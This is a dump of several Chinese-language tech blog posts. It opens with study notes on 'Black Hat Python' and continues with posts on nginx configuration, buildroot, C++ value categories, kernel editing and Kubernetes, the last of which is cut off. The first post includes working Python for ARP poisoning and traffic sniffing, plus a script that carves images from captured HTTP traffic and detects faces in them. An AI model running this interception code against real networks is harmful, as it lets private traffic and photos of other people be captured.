Target %s is at %s\u0026#34; % (tgt_ip, tgt_mac)) # start poison thread poison_thread = threading.Thread(target=poison_target, args=(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac) ) poison_thread.start() try: print(\u0026#34;[*] Starting sniffer for %d packets\u0026#34; % packet_count) bpf_filter = \u0026#34;ip host %s\u0026#34; % tgt_ip packets = sniff(count=packet_count, filter=bpf_filter, iface=interface ) # write out the captured packets print(\u0026#34;[*] Writing packets to arper.pcap\u0026#34;) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) except KeyboardInterrupt: pass finally: poisoning = False # wait for poisoning thread to exit time.sleep(2) # restore the network restore_target(tgt_gateway, tgt_gateway_mac, tgt_ip, tgt_mac ) sys.exit(0) 這裡是做arp汙染，把gateway的eth addr用成自己的 這樣就能上面的sniffer來看封包\n手法是一直發假的arp這樣只要有機器吃到，就會把封包丟到這裡 但現在這個手法都行不通拉 都會被擋\n還有一個是讀pcap來找出圖片，同時對圖片作人臉辨識 pic_carver.py\nimport cv2 from kamene.all import * pictures_directory = \u0026#34;pic_carver/pictures\u0026#34; faces_directory = \u0026#34;pic_carver/faces\u0026#34; pcap_file = \u0026#34;bhp.pcap\u0026#34; def face_detect(path, file_name): img = cv2.imread(path) cascade = cv2.CascadeClassifier(\u0026#34;haarcascade_frontalface_alt.xml\u0026#34;) rects = cascade.detectMultiScale(img, 1.3, 4, cv2.CASCADE_SCALE_IMAGE, (20, 20) ) if len(rects) == 0: return False rects[:, 2:] += rects[:, :2] # highlight the faces in the image for x1, y1, x2, y2 in rects: cv2.rectangle(img, (x1, y1), (x2, y2), (127, 255, 0), 2) cv2.imwrite(\u0026#34;%s/%s-%s\u0026#34; % (faces_directory, pcap_file, file_name), img) return True def get_http_headers(http_payload): try: # split the headers off if it is HTTP traffic headers_raw = http_payload[:http_payload.index(\u0026#34;\\r\\n\\r\\n\u0026#34;) + 2] # break out the headers headers = dict( re.findall(r\u0026#34;(?P\u0026lt;name\u0026gt;.*?): (?P\u0026lt;value\u0026gt;.*?)\\r\\n\u0026#34;, headers_raw)) except: return None if \u0026#34;Content-Type\u0026#34; not in headers: return None return headers def extract_image(headers, http_payload): image = None image_type = None try: if \u0026#34;image\u0026#34; in headers[\u0026#39;Content-Type\u0026#39;]: # grab the image type and image body image_type = headers[\u0026#39;Content-Type\u0026#39;].split(\u0026#34;/\u0026#34;)[1] image = http_payload[http_payload.index(\u0026#34;\\r\\n\\r\\n\u0026#34;) + 4:] # if we detect compression decompress the image try: if \u0026#34;Content-Encoding\u0026#34; in list(headers.keys()): if headers[\u0026#39;Content-Encoding\u0026#39;] == \u0026#34;gzip\u0026#34;: image = zlib.decompress(image, 16 + zlib.MAX_WBITS) elif headers[\u0026#39;Content-Encoding\u0026#39;] == \u0026#34;deflate\u0026#34;: image = zlib.decompress(image) except: pass except: return None, None return image, image_type def http_assembler(pcap_fl): carved_images = 0 faces_detected = 0 a = rdpcap(pcap_fl) sessions = a.sessions() for session in sessions: http_payload = \u0026#34;\u0026#34; for packet in sessions[session]: try: if packet[TCP].dport == 80 or packet[TCP].sport == 80: # reassemble the stream into a single buffer http_payload += str(packet[TCP].payload) except: pass headers = get_http_headers(http_payload) if headers is None: continue image, image_type = extract_image(headers, http_payload) if image is not None and image_type is not None: # store the image file_name = \u0026#34;%s-pic_carver_%d.%s\u0026#34; % ( pcap_fl, carved_images, image_type) fd = open(\u0026#34;%s/%s\u0026#34; % (pictures_directory, file_name), \u0026#34;wb\u0026#34;) fd.write(image) fd.close() carved_images += 1 # now attempt face detection try: result = face_detect(\u0026#34;%s/%s\u0026#34; % (pictures_directory, file_name), file_name) if result is True: faces_detected += 1 except: pass return carved_images, faces_detected carved_img, faces_dtct = http_assembler(pcap_file) print(\u0026#34;Extracted: %d images\u0026#34; % carved_images) print(\u0026#34;Detected: %d faces\u0026#34; % faces_detected) 整個流程是\n把封包導向自己 (arper.py) sniff出需要的封包，存成pcap (mail_sniffer.py，雖然沒有存成pcap的部分) 對pcap做分析(pic_carver.py) ","permalink":"https://littlebees.github.io/2020/09/blackhat-python-network-programming/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e來做個筆記吧\u003c/p\u003e\n\u003cp\u003e這裡有帶到基本的network programming與SSH的使用\u003c/p\u003e","title":"blackhat python - network programming"},{"content":"動機 之前有用過nginx做reverse proxy連到signal server 提供HTTPS連線\n現在想把nginx拿來做別的事，所以先survey一下nginx的基本功能吧\nlocation exact match = \u0026lt;pattern\u0026gt; 要剛好一樣，遇到後就停止搜尋，優先序最高\nlongest prefix match ^~ \u0026lt;pattern\u0026gt; 只要前綴符合就結束其他的比對，優先序第二高\nregex match ~ \u0026lt;regex\u0026gt; or ~* \u0026lt;regex\u0026gt; 可以用?\u0026lt;name\u0026gt;來設定變數 (Perl 5.10 compatible syntax, supported since PCRE-7.0) 同時這個設定變數(name capture)也可以用在server_name\n優先序第三高\nprefix match 一般常見的那種，就算把這種match寫在第一個，也會先看之後有沒有前面三種的可以match 優先序最低，如果有regex的match就會用regex的match\nnamed location 類似function\nlocation / { try_files $uri $uri/ @custom } location @custom { # ...do something } proxy X-Forwarded-For \u0026amp; Forwarded header X開頭的header都是自訂的header，現在有標準化就可以用標準化的header\nBefore\nX-Forwarded-For: 12.34.56.78, 23.45.67.89 X-Real-IP: 12.34.56.78 X-Forwarded-Host: example.com X-Forwarded-Proto: https After\nForwarded: for=12.34.56.78;host=example.com;proto=https, for=23.45.67.89 用頓號區分ip\n在官網上有把$remote_addr (srcIP)與$http_forwarded (srcIP,port)轉成Forwardedheader的code\nmap $remote_addr $proxy_forwarded_elem { # IPv4 addresses can be sent as-is ~^[0-9.]+$ \u0026#34;for=$remote_addr\u0026#34;; # IPv6 addresses need to be bracketed and quoted ~^[0-9A-Fa-f:.]+$ \u0026#34;for=\\\u0026#34;[$remote_addr]\\\u0026#34;\u0026#34;; # Unix domain socket names cannot be represented in RFC 7239 syntax default \u0026#34;for=unknown\u0026#34;; } map $http_forwarded $proxy_add_forwarded { # If the incoming Forwarded header is syntactically valid, append to it \u0026#34;~^(,[ \\\\t]*)*([!#$%\u0026amp;\u0026#39;*+.^_`|~0-9A-Za-z-]+=([!#$%\u0026amp;\u0026#39;*+.^_`|~0-9A-Za-z-]+|\\\u0026#34;([\\\\t \\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7E\\\\x80-\\\\xFF]|\\\\\\\\[\\\\t \\\\x21-\\\\x7E\\\\x80-\\\\xFF])*\\\u0026#34;))?(;([!#$%\u0026amp;\u0026#39;*+.^_`|~0-9A-Za-z-]+=([!#$%\u0026amp;\u0026#39;*+.^_`|~0-9A-Za-z-]+|\\\u0026#34;([\\\\t \\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7E\\\\x80-\\\\xFF]|\\\\\\\\[\\\\t \\\\x21-\\\\x7E\\\\x80-\\\\xFF])*\\\u0026#34;))?)*([ \\\\t]*,([ \\\\t]*([!#$%\u0026amp;\u0026#39;*+.^_`|~0-9A-Za-z-]+=([!#$%\u0026amp;\u0026#39;*+.^_`|~0-9A-Za-z-]+|\\\u0026#34;([\\\\t \\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7E\\\\x80-\\\\xFF]|\\\\\\\\[\\\\t \\\\x21-\\\\x7E\\\\x80-\\\\xFF])*\\\u0026#34;))?(;([!#$%\u0026amp;\u0026#39;*+.^_`|~0-9A-Za-z-]+=([!#$%\u0026amp;\u0026#39;*+.^_`|~0-9A-Za-z-]+|\\\u0026#34;([\\\\t \\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7E\\\\x80-\\\\xFF]|\\\\\\\\[\\\\t \\\\x21-\\\\x7E\\\\x80-\\\\xFF])*\\\u0026#34;))?)*)?)*$\u0026#34; \u0026#34;$http_forwarded, $proxy_forwarded_elem\u0026#34;; # Otherwise, replace it default \u0026#34;$proxy_forwarded_elem\u0026#34;; } proxy_set_header Forwarded $proxy_add_forwarded; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # Coexistence with X- 但要注意ticket #1316的問題，$http_forwarded只會有一個for!!\nsimple example server { listen myhost:80; server_name myhost; location / { root /path/to/myapp/public; proxy_set_header X-Forwarded-Host $host:$server_port; proxy_set_header X-Forwarded-Server $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://myapp:8080; } } redirect: rewrite, if, return, set set set $\u0026lt;name\u0026gt; val\nreturn \u0026amp; break return status_code [text | URL] 或是 return URL break就是break\n兩個都是讓rewrite或是if停下來，但return會丟status code與URL\nrewrite rewrite path1 path2 [opt] path1的比對值是$URI 也就是像hi.php?a=b path1的pattern只會與hi.php比對\n如果需要$query_string被改寫 要額外處理像\nif ($query_string ~* \u0026#34;name=(.*)\u0026#34;) { set $name $1; rewrite /info.php /result.php?newname=$name break; ## rewrite /info.php /result.php?newname=$1 break; } rewrite /info.php /result.php?newname=$1 break;的坑是 $1是看path1比對的結果\nbreak, last, redirect , perminate, 空白 break: 不看其他的rewrite last: 回到location再跑一次 redirect: 302, 臨時的redirect perminate: 301, 永久的轉移 空白: 繼續往下跑其他rewrite(好像switch阿) last \u0026amp; break 借一下這裡的例子來分析\nrewrite /test2 /tt break; location /test { ## 1 rewrite /test2 /test3 break; rewrite /test /test2 last; ## 2 rewrite /test2 /test3 break; } location /test2 { ## 3 return 508; } location /test3 { return 503; } ## /test =\u0026gt; 508 現在先把rewrite分成 server -\u0026gt; locations -\u0026gt; location\n所以在location的last，會回到上一層在跑一次比對\nrewrite /tt /index.html break; rewrite /test2 /tt last; ## 1 location /test { rewrite /test2 /test3 break; rewrite /test /test2 last; rewrite /test2 /test3 break; } location /test2 { return 508; } location /test3 { return 503; } location / { root html; index index.html index.htm; } ## 2 , no match ## test2 =\u0026gt; not exist 如果把last看成回到上一層再跑一次， server的last因為沒有上一層可以回去，所以她的行為與break，就是直接到下一層的比對\nif 就是bash的if，但是沒有else的部分 可以用location的比對像regex等等\nsafe if 根據這裡的分析 if會產生自己的location block，如果其中有自己的content handler，就會用，不然就繼承外面的\n整個rewrite module，會把他的directive翻成自己的指令 先跑自己所有的指令後才跑其他的directive\n像\nlocation /if-try-files { try_files /file @fallback; ## wont work set $true 1; if ($true) { ## here is new location!! forget previous location # nothing } } 所以安全使用if的原則是\nif中盡量只放rewrite module的directive 把所有if放在非rewrite module的directive前面 或是用其他directive取代if，像if(-f ...)換成try_files Virtual Host 想像有很多nginx.conf(對應一台主機) 都放在sites-available\n而實際對外看到的就是在sites-enabled中有symbol link的conf\nXSendfile (X-Accel) 就是當網站要送檔案時可以直接用header的內容來告訴nginx去送某個檔案。 而不是把檔案放在body中再丟出去\n## /protected/iso.img location /protected/ { internal; root /some/path; ## path: /some/path/protected/iso.img ## alias /some/path/; ## path: /some/path/iso.img } basic server conf server { listen 8080; root /data/up1; #從哪邊開始找檔案 location / { fastcgi_pass localhost:9000; # fastcgi的server在哪? fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; # 與bash串接string的方式一樣 fastcgi_param QUERY_STRING $query_string; } location ~ \\.(gif|jpg|png)$ { root /data/images; } } full example user www www; ## Default: nobody worker_processes 5; ## Default: 1, 能開幾個process error_log logs/error.log; pid logs/nginx.pid; worker_rlimit_nofile 8192; ## 一個process最多能開幾個檔案 events { ## 處理與接收連線有關的參數，實際連線(socket)的參數要去http調 worker_connections 4096; ## Default: 1024 一個process最多能accept幾條連線 } http { include conf/mime.types; ## include就是macro展開 include /etc/nginx/proxy.conf; include /etc/nginx/fastcgi.conf; index index.html index.htm index.php; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] $status \u0026#39; \u0026#39;\u0026#34;$request\u0026#34; $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; server_tokens off; ## 在錯誤頁面顯示nginx的版本號? access_log logs/access.log main; ## 可以調tcp的參數 sendfile on; ## 類似splice，實現zerocopy tcp_nopush on; ## TCP_CORK，等到tcp pkt到一定大小，再丟出封包 server_names_hash_bucket_size 128; # this seems to be required for some vhosts ## 壓縮 gzip on; gzip_vary on; ## vary是cache的key的額外key gzip_disable \u0026#34;msie6\u0026#34;; gzip_proxied any; ## 找有沒有壓縮過的 gzip_min_length 1000; gzip_comp_level 6; gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript; server { # php/fastcgi listen 80; server_name domain1.com www.domain1.com; access_log logs/domain1.access.log main; root html; location ~ \\.php$ { fastcgi_pass 127.0.0.1:1025; } } server { # simple reverse-proxy listen 80; server_name domain2.com www.domain2.com; access_log logs/domain2.access.log main; # serve static files location ~ ^/(images|javascript|js|css|flash|media|static)/ { root /var/www/virtual/big.server.com/htdocs; expires 30d; } # pass requests for dynamic content to rails/turbogears/zope, et al location / { proxy_pass http://127.0.0.1:8080; } } upstream big_server_com { ## 做簡單的load balance，用rr server 127.0.0.3:8000 weight=5; server 127.0.0.3:8001 weight=5; server 192.168.0.1:8000; server 192.168.0.1:8001; } server { # simple load balancing listen 80; server_name big.server.com; access_log logs/big.server.access.log main; location / { proxy_pass http://big_server_com; } } } Ref nginx beginner full example advanced conf server name forwarded rewrite_module if is eval rewrite \u0026amp; query_string bunch of NGINX var list x-accel\n","permalink":"https://littlebees.github.io/2020/08/nginx%E7%9A%84%E7%B0%A1%E5%96%AEsurvey/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前有用過nginx做reverse proxy連到signal server\n提供HTTPS連線\u003c/p\u003e\n\u003cp\u003e現在想把nginx拿來做別的事，所以先survey一下nginx的基本功能吧\u003c/p\u003e","title":"nginx的簡單survey"},{"content":"動機 記下把buildroot原本的package用成自己的時候遇到的坑\nbzcat is not a bzip2 file 原本buildroot對於下載回來的tar檔都會有自己的檔名\n而buildroot解壓tar檔都是看檔名，像\ntar.bz2會用bzip2的方式解壓 tar.gz會用gzip的方式解壓\n但如果檔名給錯就會出事\n用file可以看到\ntooy@root:~$ file master.tar.bz2 master.tar.bz2: Zip archive data, at least v1.0 to extract 如果port成自己的package在mk要加\n... MYPKG_SOURCE = mypkg-$(MYPKG_VERSION).zip ... autoconf 沒有跑 加入\n... MYPKG_AUTORECONF = YES ... 到mk檔，就會跑autoconf了\nRef file man\n","permalink":"https://littlebees.github.io/2020/08/%E5%A5%87%E8%81%9E%E8%BB%BC%E4%BA%8B-buildroot%E7%9A%84%E5%9D%91/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記下把buildroot原本的package用成自己的時候遇到的坑\u003c/p\u003e","title":"奇聞軼事-buildroot的坑"},{"content":"動機 auto hi = [](string\u0026amp; s) { return s+\u0026#34;!\u0026#34;; } hi(\u0026#34;123\u0026#34;); 這會報錯，十分反人類\nlvalue與rvalue 雖然說在spec定義的很多又很長\n可以想像成有兩個區塊放資料 一個是有被變數指到的資料 另一個是算完了，但還沒指定到變數的資料\n被變數指到的資料 就是 lvalue，可以用\u0026amp;來pass ref 還沒指定到變數的資料 就是 rlvaue，要用\u0026amp;\u0026amp;來pass ref\n","permalink":"https://littlebees.github.io/2020/08/c-%E7%9A%84%E5%B7%A6%E5%8F%B3%E5%80%BC/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-cpp\" data-lang=\"cpp\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eauto\u003c/span\u003e \u003cspan class=\"n\"\u003ehi\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[](\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ehi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;123\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e這會報錯，十分反人類\u003c/p\u003e","title":"C++的左右值"},{"content":"動機 改kernel的心得\n備妥工具 vscode與trace tool vscode的調整: 減少搜尋的範圍 { \u0026#34;search.exclude\u0026#34;: { // 保留要改的部分，其他不要看 \u0026#34;**/.git\u0026#34;: true, \u0026#34;**/.svn\u0026#34;: true, \u0026#34;**/.DS_Store\u0026#34;: true, \u0026#34;**/drivers\u0026#34;: true, \u0026#34;**/sound\u0026#34;: true, \u0026#34;**/tools\u0026#34;: true, \u0026#34;**/arch/alpha\u0026#34;: true, \u0026#34;**/arch/arc\u0026#34;: true, \u0026#34;**/arch/c6x\u0026#34;: true, \u0026#34;**/arch/h8300\u0026#34;: true, \u0026#34;**/arch/hexagon\u0026#34;: true, \u0026#34;**/arch/ia64\u0026#34;: true, \u0026#34;**/arch/m32r\u0026#34;: true, \u0026#34;**/arch/m68k\u0026#34;: true, \u0026#34;**/arch/microblaze\u0026#34;: true, \u0026#34;**/arch/mn10300\u0026#34;: true, \u0026#34;**/arch/nds32\u0026#34;: true, \u0026#34;**/arch/nios2\u0026#34;: true, \u0026#34;**/arch/parisc\u0026#34;: true, \u0026#34;**/arch/powerpc\u0026#34;: true, \u0026#34;**/arch/s390\u0026#34;: true, \u0026#34;**/arch/sparc\u0026#34;: true, \u0026#34;**/arch/score\u0026#34;: true, \u0026#34;**/arch/sh\u0026#34;: true, \u0026#34;**/arch/um\u0026#34;: true, \u0026#34;**/arch/unicore32\u0026#34;: true, \u0026#34;**/arch/xtensa\u0026#34;: true }, //-------- Files configuration -------- // Configure glob patterns for excluding files and folders. \u0026#34;files.exclude\u0026#34;: { \u0026#34;**/.git\u0026#34;: true, \u0026#34;**/.svn\u0026#34;: true, \u0026#34;**/.DS_Store\u0026#34;: true, \u0026#34;**/drivers\u0026#34;: true, \u0026#34;**/sound\u0026#34;: true, \u0026#34;**/tools\u0026#34;: true, \u0026#34;**/arch/alpha\u0026#34;: true, \u0026#34;**/arch/arc\u0026#34;: true, \u0026#34;**/arch/c6x\u0026#34;: true, \u0026#34;**/arch/h8300\u0026#34;: true, \u0026#34;**/arch/hexagon\u0026#34;: true, \u0026#34;**/arch/ia64\u0026#34;: true, \u0026#34;**/arch/m32r\u0026#34;: true, \u0026#34;**/arch/m68k\u0026#34;: true, \u0026#34;**/arch/microblaze\u0026#34;: true, \u0026#34;**/arch/mn10300\u0026#34;: true, \u0026#34;**/arch/nds32\u0026#34;: true, \u0026#34;**/arch/nios2\u0026#34;: true, \u0026#34;**/arch/parisc\u0026#34;: true, \u0026#34;**/arch/powerpc\u0026#34;: true, \u0026#34;**/arch/s390\u0026#34;: true, \u0026#34;**/arch/sparc\u0026#34;: true, \u0026#34;**/arch/score\u0026#34;: true, \u0026#34;**/arch/sh\u0026#34;: true, \u0026#34;**/arch/um\u0026#34;: true, \u0026#34;**/arch/unicore32\u0026#34;: true, \u0026#34;**/arch/xtensa\u0026#34;: true } } vscode的調整: includePath { \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Linux\u0026#34;, \u0026#34;includePath\u0026#34;: [ \u0026#34;${workspaceFolder}/arch/arm64/include/**\u0026#34;, \u0026#34;${workspaceFolder}/include/**\u0026#34;, \u0026#34;${workspaceFolder}/arch/arm64/**\u0026#34;, \u0026#34;${workspaceFolder}/**\u0026#34; ], \u0026#34;defines\u0026#34;: [], \u0026#34;compilerPath\u0026#34;: \u0026#34;/usr/bin/gcc\u0026#34;, \u0026#34;cStandard\u0026#34;: \u0026#34;c11\u0026#34;, \u0026#34;cppStandard\u0026#34;: \u0026#34;c++17\u0026#34;, \u0026#34;intelliSenseMode\u0026#34;: \u0026#34;clang-x64\u0026#34; } ], \u0026#34;version\u0026#34;: 4 } 如果調整vscode還是太慢: GUN Global 裝GUN Global\nsudo apt install global 裝外掛: C/C++ GNU Global\nF12再打Global: Rebuild Gtags Database\n但我自己用的時候，找reference時出現的item都會重複一次，像\nvoid a(...) void a(...) void b(...) void b(...) ... 注意: trace tool還是有可能翻車 像我是用cpptool去找 結果他找xt_mark.h，就帶到錯的地方， 是用global才找到原來還有其他的地方也又xt_mark.h\npatch linux kernel的資料夾很多，如果改的檔案很多又很分散，apply修改的結果會很累 用patch代勞\ngit add . #全部加到stage git diff --staged \u0026gt; edit.diff mv edit.diff to_some_where cd to_some_where #optional git apply -v \u0026lt; edit.diff 一步一步來 一次改一小步，不然很多時候會出現意想不到的錯誤 也不知道要從何改起\n保留後路 一定要保留一個可以還原回去可以用的環境的手段 不然改爆就去世了\n錯誤訊息是你的好友 只要不是像SegmentFault那種不知道到底發生事的錯誤訊息 就是好錯誤訊息\n可以利用這個錯誤訊息去trace，找到需要改的地方\n猜 通常不會等code全部看完再去改，一般都是一邊改一邊猜大概是怎麼實現的， 也是一邊改一邊了解到底在幹嘛\n不要被嚇到 kernel code會有許多神奇的手法 像tcp的skb的繼承是用struct一層包一層 或是ipset是用header file來做繼承(幹，超難debug)\n要把握這部分的code的目的是什麼，然後先跳過神奇的部分， 專注在code如何完成功能上\nGoogle it 知名的kernel code可以賭會有人trace過 可以去看看前人的紀錄，給自己一點改與trace的線索與直覺\nRef vscode的調整 vscode與GUN Global\n","permalink":"https://littlebees.github.io/2020/08/%E6%94%B9kernel%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e改kernel的心得\u003c/p\u003e","title":"改kernel的注意事項"},{"content":"動機 突然想起有k8s，就來看看 越看越像linux主機的抽象化，最後變成近乎linux主機的framework\n架構: 把主機拆掉再變多 一開始主機是 一台電腦有\n應用程式 檔案(設定檔) 處理連線的介面(load balancer或是firewall) 應用程式 \u0026amp; 虛擬的主機 都是共用同一台實體主機的資源\n但應用程式越來越多會彼此影響 所以在同一台實體主機中用chroot與network namespace分開應用程式 但彼此之間要溝通就不能透過 記憶體與filesystem 他們已經被分開了 所以彼此之間用網路連接在一起 這就是container或是pod\n如果每個應用程式都是用網路連接在一起，那應用程式還需要限定在同一台實體主機上嗎? 因此我們可以把實體主機變多，讓應用程式跑在不同的主機上 這就是cluster\n對於使用者來說這些實體主機都是可以提供服務的，所以cluster也可以說是虛擬的主機\n如果相同的應用程式跑在不同的主機上，都提供一樣的服務，這叫scaling 如果子任務跑在不同的主機上，來跑出計算結果，這叫parllelism\n有了這麼多實體主機要怎麼分配pod? 在k8s就是deployment\n處理連線的介面 原本在同一台主機上，使怎麼區分要把連線導到哪個應用程式? 用port，像http是80、https是443 在應用程式用bind就可以綁到指定的port\n但現在每個應用程式都是被分開，所以會需要\nip(在不同的network namespace) port(在第四層網路) 這個除了用bind外，還要用iptables，也就是firewall去控制ip的封包往那邊走\n但這都還在同一台實體主機上\n如果變成像cluster那樣的虛擬主機要怎麼辦?\n基本上就是用主從式架構 一個收連線分配到某台cluster下的主機，等資料return到這裡\n這就是master node的由來\n接下去要問的是 怎麼使用服務?\n現在master node知道服務的ip與port\n所以要讓服務可以被使用，方法有\nport forwarding reverse proxy port forwarding就是service(type: NodePort) reverse proxy就是ClusterIP(ingress可以想成加料過的loadbalancer)\nservice的NodePort \u0026amp; LoadBalancer差在? port開在哪裡， NodePort開在主機上， LoadBalancer會先拉一台主機出來再開port\nLoadBalancer可以看成把master node的firewall部份抽出來單獨用\n為什麼service再分配一個ClusterIP? 為了可以用service的name直接連到Pod，service的name會被放在kube-dns中 這樣用service的name做nslookup就會拿到ip，就像部屬一台server一樣\n同樣都是讓服務可以被使用， 比起實體主機，為什麼k8s還多了ingress? 第一個是現在應用程式都有了自己的ip 第二個是一般常見的服務都是 network protocol綁定port的，像80,443\n所以ingress可以想像成DNS不過是把path換成ip\u0026amp;port DNS是domain name換成ip\n(有注意到嗎，在網站上，path是換成對應的controller，所以ingress的角色其實是與網站上的router相當)\nservice不加上selector(不是把流量導到cluster中)的話? service就是在實體主機上的bind 所以也可以把流量導到其他地方去，像\napiVersion: v1 kind: Service metadata: name: my-service spec: ports: - protocol: TCP port: 80 targetPort: 9376 apiVersion: v1 kind: Endpoints metadata: name: my-service subsets: - addresses: - ip: 192.0.2.42 ports: - port: 9376 Namespaces就是不同的cluster，其實就是不同的虛擬主機\n部署服務 流程是\ndeployment生pod service把port綁到指定的pod ingress把路徑綁到port(service) 指定某東西 如何指定就是用label，像\napiVersion: apps/v1beta2 # for kubectl versions \u0026gt;= 1.9.0 use apps/v1 kind: Deployment metadata: name: hello-deployment spec: replicas: 3 selector: matchLabels: # here app: my-deployment matchExpressions: - {key: tier, operator: In, values: [cache]} - {key: environment, operator: NotIn, values: [dev]} template: metadata: labels: # here app: my-deployment spec: containers: - name: my-pod image: zxcvbnius/docker-demo:latest ports: - containerPort: 3000 如果是在commandline上要指定的話\nkubectl get pods -l environment=production,tier=frontend kubectl get pods -l \u0026#39;environment in (production),tier in (frontend)\u0026#39; kubectl get pods -l \u0026#39;environment in (production, qa)\u0026#39; kubectl get pods -l \u0026#39;environment,environment notin (frontend)\u0026#39; 另外可以用go-template，來客製顯示的資訊\n[root@node root]# kubectl get pods --all-namespaces -o go-template --template=\u0026#39;{{range .items}}{{.metadata.uid}} {{end}}\u0026#39; 0313ffff-f1f4-11e7-9cda-40f2e9b98448 ee49bdcd-f1f2-11e7-9cda-40f2e9b98448 f1e0eb80-f1f2-11e7-9cda-40f2e9b98448 [root@node root]# kubectl get pods --all-namespaces -o go-template --template=\u0026#39;{{range .items}}{{printf \u0026#34;|%-20s|%-50s|%-30s|\\n\u0026#34; .metadata.namespace .metadata.name .metadata.uid}}{{end}}\u0026#39; |console |console-4d2d7eab-1377218307-7lg5v |0313ffff-f1f4-11e7-9cda-40f2e9b98448| |console |console-4d2d7eab-1377218307-q3bjd |ee49bdcd-f1f2-11e7-9cda-40f2e9b98448| |cxftest |ipreserve-f15257ec-3788284754-nmp3x |f1e0eb80-f1f2-11e7-9cda-40f2e9b98448| Horizontal Pod Autoscaling Deployment控制Pod的數量 Horizontal Pod Autoscaling控制Deployment的數量\napiVersion: autoscaling/v1 kind: HorizontalPodAutoscaler metadata: name: helloworld-hpa spec: scaleTargetRef: apiVersion: apps/v1beta2 kind: Deployment name: helloworld-deployment minReplicas: 2 maxReplicas: 5 targetCPUUtilizationPercentage: 50 DaemonSet 如果每個Node都要跑這個pod，像是monitor或log 就可以用DaemonSet\napiVersion: apps/v1 kind: DaemonSet metadata: name: fluentd-elasticsearch namespace: kube-system labels: k8s-app: fluentd-logging spec: selector: matchLabels: name: fluentd-elasticsearch template: metadata: labels: name: fluentd-elasticsearch spec: tolerations: # this toleration is to have the daemonset runnable on master nodes # remove it if your masters can\u0026#39;t run pods - key: node-role.kubernetes.io/master effect: NoSchedule containers: - name: fluentd-elasticsearch image: quay.io/fluentd_elasticsearch/fluentd:v2.5.2 resources: limits: memory: 200Mi requests: cpu: 100m memory: 200Mi volumeMounts: - name: varlog mountPath: /var/log - name: varlibdockercontainers mountPath: /var/lib/docker/containers readOnly: true terminationGracePeriodSeconds: 30 volumes: - name: varlog hostPath: path: /var/log - name: varlibdockercontainers hostPath: path: /var/lib/docker/containers 管理Node 停用node: kubectl drain {node_name} 啟用node: kubectl uncordon {node_name} 限制資源 Pod本身可以限制或要求最多或最少需要多少資源\n當然也可以從外部限制\napiVersion: v1 kind: List items: - apiVersion: v1 kind: ResourceQuota metadata: name: pods-high spec: hard: cpu: \u0026#34;1000\u0026#34; memory: 200Gi pods: \u0026#34;10\u0026#34; scopeSelector: matchExpressions: - operator : In scopeName: PriorityClass values: [\u0026#34;high\u0026#34;] - apiVersion: v1 kind: ResourceQuota metadata: name: pods-medium spec: hard: cpu: \u0026#34;10\u0026#34; memory: 20Gi pods: \u0026#34;10\u0026#34; scopeSelector: matchExpressions: - operator : In scopeName: PriorityClass values: [\u0026#34;medium\u0026#34;] - apiVersion: v1 kind: ResourceQuota metadata: name: pods-low spec: hard: cpu: \u0026#34;5\u0026#34; memory: 10Gi pods: \u0026#34;10\u0026#34; scopeSelector: matchExpressions: - operator : In scopeName: PriorityClass values: [\u0026#34;low\u0026#34;] apiVersion: v1 kind: Pod metadata: name: high-priority spec: containers: - name: high-priority image: ubuntu command: [\u0026#34;/bin/sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;while true; do echo hello; sleep 10;done\u0026#34;] resources: requests: memory: \u0026#34;10Gi\u0026#34; cpu: \u0026#34;500m\u0026#34; limits: memory: \u0026#34;10Gi\u0026#34; cpu: \u0026#34;500m\u0026#34; priorityClassName: high 除了pod的限制，也能限制namespace\napiVersion: v1 kind: ResourceQuota 